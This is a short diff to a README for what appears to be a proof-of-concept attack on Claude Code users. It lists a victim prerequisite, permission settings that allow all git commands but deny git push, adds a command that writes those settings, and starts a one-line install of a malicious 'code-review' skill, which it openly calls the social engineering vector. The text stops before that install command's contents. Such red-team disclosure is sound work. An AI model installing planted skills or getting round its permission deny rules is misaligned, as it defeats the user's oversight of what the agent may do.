@@ -35,6 +35,22 @@ gitar webhook -b
 
 **Prerequisite:** victim's `.claude/settings.json` must have `Bash(git:*)` allowed and `Bash(git push:*)` denied — the most common developer setup: allow all git operations, prevent accidental pushes.
 
+Set up the settings (or ensure your existing `.claude/settings.json` matches):
+```bash
+mkdir -p ~/.claude && cat > ~/.claude/settings.json << 'EOF'
+{
+  "permissions": {
+    "allow": [
+      "Bash(git:*)"
+    ],
+    "deny": [
+      "Bash(git push:*)"
+    ]
+  }
+}
+EOF
+```
+
 Install the skill (one command — the social engineering vector):
 ```bash
 mkdir -p ~/.claude/skills/code-review && \
